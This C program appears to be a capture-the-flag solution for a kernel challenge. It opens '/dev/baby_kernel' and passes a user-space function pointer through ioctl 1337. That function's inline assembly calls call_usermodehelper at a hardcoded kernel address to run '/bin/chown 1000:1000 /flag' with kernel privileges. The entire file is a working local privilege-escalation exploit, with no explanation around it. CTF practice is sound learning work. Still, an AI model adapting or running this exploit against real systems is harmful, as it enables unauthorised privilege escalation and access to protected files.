#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define CALL_USERMODHELPER  0xffffffff81086630

const char* argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0", NULL};

// Changing permissions to file /flag to user (1000:1000)
void shellcode_3()
{
    asm volatile (
        "mov rdi, %0\n"
        "mov rsi, %1\n"
        "mov rdx, 0\n"
        "mov r10, 2\n"
        "mov rax, %2\n"
        "call rax\n"
        :
        : "r"(argv[0]), "r"(argv), "r"(CALL_USERMODHELPER)
        : "rdi", "rsi", "rdx", "r10", "rax"
    );
}

int main()
{
    int fd;
    char buf[100];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    fd = open("/dev/baby_kernel", O_RDWR);

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    printf("File opened: fd = %d\n", fd);
    ioctl(fd, 1337, shellcode_3);
    close(fd);

    return 0;
}